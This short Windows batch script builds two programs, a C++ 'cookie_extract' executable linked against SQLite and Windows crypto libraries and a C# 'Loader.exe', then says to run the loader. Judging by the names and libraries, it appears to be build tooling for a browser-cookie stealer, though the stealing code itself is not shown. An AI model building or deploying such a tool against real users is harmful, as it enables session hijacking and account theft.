@echo off
setlocal

echo [*] building c++ core
g++ -O2 -o cookie_extract.exe core\cookie_extract.cpp ^
    -lsqlite3 -lbcrypt -lcrypt32 -lshlwapi -static
if errorlevel 1 goto :fail

echo [*] building c# loader
csc /out:Loader.exe loader\Loader.cs
if errorlevel 1 goto :fail

echo [*] done. run Loader.exe
exit /b 0

:fail
echo [!] build failed
exit /b 1